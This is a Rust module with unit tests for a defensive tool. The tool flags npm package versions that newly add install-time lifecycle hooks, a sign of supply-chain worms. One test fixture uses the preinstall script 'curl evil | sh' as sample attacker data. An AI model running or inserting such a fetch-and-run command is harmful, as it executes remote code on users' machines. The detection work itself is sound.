// Install-script drift detector.
//
// Reputation-based checks (OSV advisories, maintainer bursts) ask "who published
// this, and when". This asks a behavioral question instead: "does the version
// you pinned run install-time code that the version before it did not?"
//
// Shai-Hulud-style payloads execute through npm lifecycle hooks (`preinstall` /
// `install` / `postinstall`) that fire automatically on `npm install`. A stable
// package that suddenly grows such a hook in a non-major release is a strong,
// OSV-independent, zero-day-capable signal — and legitimate packages almost
// never do it. We compare the pinned version against its immediate
// chronological predecessor (time-ordered, not semver-ordered, so an attacker
// publishing out of order can't dodge it).

use anyhow::Result;
use chrono::DateTime;
use std::collections::BTreeSet;

use crate::registry::{self, Packument};

// Hooks npm runs automatically when a dependency is installed from the registry.
const INSTALL_HOOKS: [&str; 3] = ["preinstall", "install", "postinstall"];

#[derive(Debug, Clone)]
pub struct DriftHit {
    pub package: String,
    pub version: String,
    pub prev_version: String,
    // (hook name, script body) pairs introduced in `version` vs `prev_version`.
    pub introduced: Vec<(String, String)>,
    pub prev_size: u64,
    pub cur_size: u64,
}

pub struct DriftResult {
    pub hits: Vec<DriftHit>,
    pub packages_queried: usize,
    pub fetch_failures: usize,
}

pub fn detect(deps: &[(String, String)]) -> Result<DriftResult> {
    let client = registry::make_client()?;

    let names: Vec<String> = {
        let set: BTreeSet<&str> = deps.iter().map(|(n, _)| n.as_str()).collect();
        set.into_iter().map(|s| s.to_string()).collect()
    };
    let packages_queried = names.len();

    let fetched = registry::fetch_packuments_parallel(&client, &names, 8);
    let mut by_name = std::collections::BTreeMap::new();
    let mut fetch_failures = 0usize;
    for (name, opt) in fetched {
        match opt {
            Some(p) => {
                by_name.insert(name, p);
            }
            None => fetch_failures += 1,
        }
    }

    let mut hits = Vec::new();
    for (name, version) in deps {
        if let Some(packument) = by_name.get(name) {
            if let Some(hit) = analyze(name, version, packument) {
                hits.push(hit);
            }
        }
    }

    Ok(DriftResult {
        hits,
        packages_queried,
        fetch_failures,
    })
}

// Pure core: given a packument, decide whether `version` introduces an install
// hook absent in its immediate chronological predecessor. No network.
fn analyze(name: &str, version: &str, p: &Packument) -> Option<DriftHit> {
    let cur_meta = p.versions.get(version)?;
    let cur_time = parse_time(p, version)?;

    // Immediate predecessor: the version (that we have metadata for) with the
    // latest publish time strictly before `version`.
    let prev_version = p
        .versions
        .keys()
        .filter(|v| v.as_str() != version)
        .filter_map(|v| parse_time(p, v).map(|t| (v, t)))
        .filter(|(_, t)| *t < cur_time)
        .max_by_key(|(_, t)| *t)
        .map(|(v, _)| v.clone())?;
    let prev_meta = p.versions.get(&prev_version)?;

    let mut introduced = Vec::new();
    for hook in INSTALL_HOOKS {
        let cur = cur_meta.scripts.get(hook).map(String::as_str).unwrap_or("");
        let prev = prev_meta.scripts.get(hook).map(String::as_str).unwrap_or("");
        if !cur.trim().is_empty() && prev.trim().is_empty() {
            introduced.push((hook.to_string(), cur.to_string()));
        }
    }

    if introduced.is_empty() {
        return None;
    }

    Some(DriftHit {
        package: name.to_string(),
        version: version.to_string(),
        prev_version,
        introduced,
        prev_size: prev_meta.dist.unpacked_size,
        cur_size: cur_meta.dist.unpacked_size,
    })
}

fn parse_time(p: &Packument, version: &str) -> Option<chrono::DateTime<chrono::Utc>> {
    let s = p.time.get(version)?;
    DateTime::parse_from_rfc3339(s)
        .ok()
        .map(|t| t.with_timezone(&chrono::Utc))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::registry::{Dist, VersionMeta};
    use std::collections::BTreeMap;

    fn vm(scripts: &[(&str, &str)], size: u64) -> VersionMeta {
        VersionMeta {
            maintainers: Vec::new(),
            scripts: scripts
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect(),
            dist: Dist {
                unpacked_size: size,
            },
        }
    }

    fn packument(versions: &[(&str, &str, VersionMeta)]) -> Packument {
        let mut time = BTreeMap::new();
        let mut vmap = BTreeMap::new();
        for (ver, ts, meta) in versions {
            time.insert(ver.to_string(), ts.to_string());
            // can't move out of borrowed meta; rebuild
            vmap.insert(
                ver.to_string(),
                VersionMeta {
                    maintainers: Vec::new(),
                    scripts: meta.scripts.clone(),
                    dist: Dist {
                        unpacked_size: meta.dist.unpacked_size,
                    },
                },
            );
        }
        Packument {
            time,
            maintainers: Vec::new(),
            versions: vmap,
        }
    }

    #[test]
    fn flags_introduced_postinstall() {
        let p = packument(&[
            ("0.3.4", "2026-05-01T00:00:00Z", vm(&[], 1000)),
            (
                "0.3.5",
                "2026-05-19T01:56:41Z",
                vm(&[("postinstall", "node setup.mjs")], 9000),
            ),
        ]);
        let hit = analyze("@antv/adjust", "0.3.5", &p).expect("should flag");
        assert_eq!(hit.prev_version, "0.3.4");
        assert_eq!(hit.introduced.len(), 1);
        assert_eq!(hit.introduced[0].0, "postinstall");
        assert_eq!(hit.cur_size, 9000);
    }

    #[test]
    fn no_flag_when_predecessor_already_had_hook() {
        // node-sass style: postinstall present in both → legitimate, not drift.
        let p = packument(&[
            (
                "1.0.0",
                "2026-01-01T00:00:00Z",
                vm(&[("postinstall", "node build.js")], 5000),
            ),
            (
                "1.0.1",
                "2026-02-01T00:00:00Z",
                vm(&[("postinstall", "node build.js")], 5100),
            ),
        ]);
        assert!(analyze("native-thing", "1.0.1", &p).is_none());
    }

    #[test]
    fn no_flag_for_first_ever_version() {
        // No predecessor to compare against → can't be "drift".
        let p = packument(&[(
            "1.0.0",
            "2026-01-01T00:00:00Z",
            vm(&[("postinstall", "node x.js")], 5000),
        )]);
        assert!(analyze("brand-new", "1.0.0", &p).is_none());
    }

    #[test]
    fn uses_chronological_not_semver_predecessor() {
        // 0.9.0 published AFTER 1.0.0 (out-of-order republish by attacker).
        // Predecessor of 0.9.0 is 1.0.0 by time, and 1.0.0 had no hook.
        let p = packument(&[
            ("1.0.0", "2026-05-01T00:00:00Z", vm(&[], 1000)),
            (
                "0.9.0",
                "2026-05-19T00:00:00Z",
                vm(&[("preinstall", "curl evil | sh")], 1200),
            ),
        ]);
        let hit = analyze("victim", "0.9.0", &p).expect("should flag");
        assert_eq!(hit.prev_version, "1.0.0");
        assert_eq!(hit.introduced[0].0, "preinstall");
    }
}
